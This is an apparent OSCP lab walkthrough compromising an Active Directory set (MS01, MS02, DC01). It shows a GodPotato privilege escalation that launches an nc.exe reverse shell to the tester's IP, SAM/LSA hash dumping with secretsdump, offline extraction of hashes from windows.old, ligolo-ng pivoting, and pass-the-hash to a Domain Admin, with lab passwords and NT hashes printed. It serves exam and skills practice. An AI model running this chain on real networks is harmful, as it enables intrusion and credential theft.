##### Tags: `nxc`  `ligolo ng`  `windows.old` 

# 🪟OSCP-A (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.152.141

PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp    open     http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
81/tcp    open     http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
3306/tcp  open     mysql         MySQL (unauthorized)
3307/tcp  open     mysql         MariaDB 10.3.24 or later (unauthorized)
4989/tcp  filtered parallel
5040/tcp  open     unknown
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
we got the provided credential to winrm to MS01
the domain name is oscp.exam
```console
$ nxc winrm 192.168.158.141 -u Eric.Wallows -p 'EricLikesRunning800'                     

WINRM       192.168.158.141 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
WINRM       192.168.158.141 5985   MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
```
```console
*Evil-WinRM* PS C:\Users> hostname
MS01
```
we have SeImpersonatePrivilege
```console
*Evil-WinRM* PS C:\Users> whoami /all

User Name         SID
================= ==============================================
oscp\eric.wallows S-1-5-21-2610934713-1581164095-2706428072-7605

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled
```
we can upload potato to abuse the SeImpersonatePrivilege 
```
*Evil-WinRM* PS C:\Temp> ./GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.184 4141"
[*] CombaseModule: 0x140703472025600
[*] DispatchTable: 0x140703474476472
[*] UseProtseqFunction: 0x140703473808496
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\010b5d33-18ce-4b6b-b885-a39f38cbbfef\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005802-0d50-ffff-a94c-71787660e5a8
[*] DCOM obj OXID: 0xb683931787a4065e
[*] DCOM obj OID: 0x1287a7c7f160e5c5
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 904 Token:0x772  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 7724
```
got the NT AUTHORITY\SYSTEM shell but unable to display result
```console
$ nc -lvnp 4141
listening on [any] 4141 ...
connect to [192.168.45.184] from (UNKNOWN) [192.168.158.141] 58469
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
```
add eric to administrators group
```console
C:\Temp>net localgroup Administrators Eric.Wallows /add
net localgroup Administrators Eric.Wallows /add
The command completed successfully.
```
since eric is in now administrators group  
we can dump the hash of SAM and LSA 
```console
$ impacket-secretsdump oscp.exam/Eric.Wallows:'EricLikesRunning800'@192.168.158.141
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::

[*] DefaultPassword 
oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
```
celia unable to log into MS01
```console
$ nxc winrm 192.168.152.141 -u celia.almeda -p 7k8XHk3dMtmpnC7

WINRM       192.168.152.141 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
WINRM       192.168.152.141 5985   MS01             [-] oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
```
do ligolo-ng port forwarding to find internal network
```console
$ sudo ./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                                   
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                   
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                    
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                     
        /____/                          /____/                                                                                      
                                                                                                                                    
  Made in France ♥            by @Nicocha30!                                                                                        
  Version: 0.8.3                                                                                                                    
                                                                                                                                    
ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
INFO[0026] Agent joined.                                 id=005056abc09b name="OSCP\\eric.wallows@MS01" remote="192.168.158.141:49491"
ligolo-ng » session
? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.152.141:49491 - 005056abc09b
[Agent : OSCP\eric.wallows@MS01] » start
INFO[0036] Starting tunnel to OSCP\eric.wallows@MS01 (005056abc09b) 
[Agent : OSCP\eric.wallows@MS01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:ab:c0:9b              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.158.141/24             │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:ab:1f:1e              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.112.141/24               │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
```
this internal network is in 10.10.112.0/24  
found the MS02 and DC01
```console
$ nxc smb 10.10.112.0/24
SMB         10.10.112.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)                                                                                                              
SMB         10.10.112.141   445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)                                                                                                             
SMB         10.10.112.142   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
```
celia can log into MS02
```console
$ nxc winrm 10.10.112.140-142 -u celia.almeda -p 7k8XHk3dMtmpnC7
WINRM       10.10.112.141   5985   MS01             [-] oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
WINRM       10.10.112.140   5985   DC01             [-] oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
WINRM       10.10.112.142   5985   MS02             [+] oscp.exam\celia.almeda:7k8XHk3dMtmpnC7 (Pwn3d!)
```
after logged found there is a windows.old folder  
windows.old is the machine was upgraded or reinstalled and the previous Windows installation was preserved
```console
$ evil-winrm -i 10.10.112.142 -u celia.almeda -p '7k8XHk3dMtmpnC7'

*Evil-WinRM* PS C:\> hostname
MS02
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---        12/19/2022  11:34 PM                Program Files
d-r---        11/10/2022   2:52 AM                Program Files (x86)
d-r---        11/14/2022   6:32 AM                Users
d-----        12/19/2022  11:38 PM                Windows
d-----          4/4/2022   6:00 AM                windows.old
-a----         6/13/2026   9:02 PM           2692 output.txt
```
we can download the SAM and SYSTEM file in program files  
use it to dump the hashes offline  
```console
*Evil-WinRM* PS C:\windows.old\Windows\System32> download SAM                                   
Info: Downloading C:\windows.old\Windows\System32\SAM to SAM                               
Info: Download successful!

*Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM                                
Info: Downloading C:\windows.old\Windows\System32\SYSTEM to SYSTEM                                  
Info: Download successful!
```
we got 4 new users
```console
$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
```
found tom_admin can winrm to DC01
```console
$ nxc winrm 10.10.112.140-142 -u user.txt -H hash.txt --continue-on-success             
WINRM       10.10.112.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
WINRM       10.10.112.140   5985   DC01             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
```
logged in as tom_admin and found he is domain admins
```console
$ evil-winrm -i 10.10.112.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
*Evil-WinRM* PS C:\Users\tom_admin\Documents> whoami
oscp\tom_admin
```
```console
*Evil-WinRM* PS C:\Users\tom_admin\Documents> net user tom_admin
User name                    tom_admin
Full Name                    Tom Admin
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/1/2022 10:30:56 AM
Password expires             Never
Password changeable          4/2/2022 10:30:56 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/13/2026 9:44:41 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```
